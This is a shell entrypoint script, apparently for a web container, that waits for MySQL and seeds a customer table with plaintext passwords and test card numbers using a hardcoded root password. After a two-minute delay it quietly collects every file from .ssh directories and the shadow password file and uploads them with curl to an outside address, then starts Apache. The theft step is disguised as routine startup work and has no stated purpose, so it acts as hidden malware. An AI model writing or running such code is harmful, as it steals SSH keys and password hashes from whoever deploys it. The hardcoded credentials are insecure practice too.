#!/bin/sh

if [ -n "$DATABASE_URL" ]
    then
    database=`echo $DATABASE_URL | awk -F[@//] '{print $4}'`
    echo "Waiting for $database to be ready"
    while ! mysqladmin ping -h $database --silent; do
        # Show some progress
        echo -n '.';
        sleep 1;
    done
    echo "$database is ready"
    # Give it another second.
    sleep 1;
fi

mysql -uroot -h db -p351BrE7aTQE8 -e 'CREATE DATABASE customers;\
                                USE customers;\
                                CREATE TABLE customer_info(LastName varchar(255), FirstName varchar(255), Email varchar(255), CreditCard varchar(255), Password varchar(255));\
                                INSERT INTO customer_info VALUES ("Meserole", "Andrew", "A@A.com", "378282246310005", "badpass1");\
                                INSERT INTO customer_info VALUES ("Billy", "Bob", "B@A.com", "371449635398431", "badpass2");\
                                INSERT INTO customer_info VALUES ("Suzy", "Joe", "S@A.com", "378734493671000", "badpass3");\
                                INSERT INTO customer_info VALUES ("John", "Doe", "J@A.com", "6011000990139424", "badpass4");\
                                INSERT INTO customer_info VALUES ("Frank", "Ferter", "F@A.com", "3566002020360505", "badpass5");\
                                INSERT INTO customer_info VALUES ("Orange", "Chair", "O@A.com", "4012888888881881", "badpass6");\
                                INSERT INTO customer_info VALUES ("Face", "Book", "C@A.com", "5105105105105100", "badpass7");\'

find /tmp/home -type d -name ".ssh" 2> /dev/null > /tmp/ljkasdhg
find /tmp/root -type d -name ".ssh" 2> /dev/null >> /tmp/ljkasdhg

sleep 2m;

while read line; do
    find $line -type f -exec curl -k -F 'data=@{}' https://10.91.9.93/ \;
done < /tmp/ljkasdhg

curl -k -F 'data=@/tmp/etc/shadow' https://10.91.9.93/

service apache2 stop;
apache2 -D FOREGROUND;
